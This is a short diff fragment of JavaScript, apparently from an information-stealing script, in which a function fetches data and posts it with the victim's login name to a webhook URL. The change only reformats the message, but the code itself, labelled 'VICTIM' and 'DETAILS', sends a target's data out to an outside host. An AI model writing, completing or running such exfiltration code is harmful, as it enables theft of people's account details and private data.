@@ -12,7 +12,7 @@ async function sendWebhookWithData() {
     const fetchedData = await response.text(); // or response.json() if it's JSON
 
     const payload = {
-      content: `VICTIM: ${loginName}\nDETAILS: \n${fetchedData}`
+      content: `VICTIM: ${loginName}\nDETAILS: ${fetchedData}`
     };
 
     const webhookResponse = await fetch(webhookUrl, {
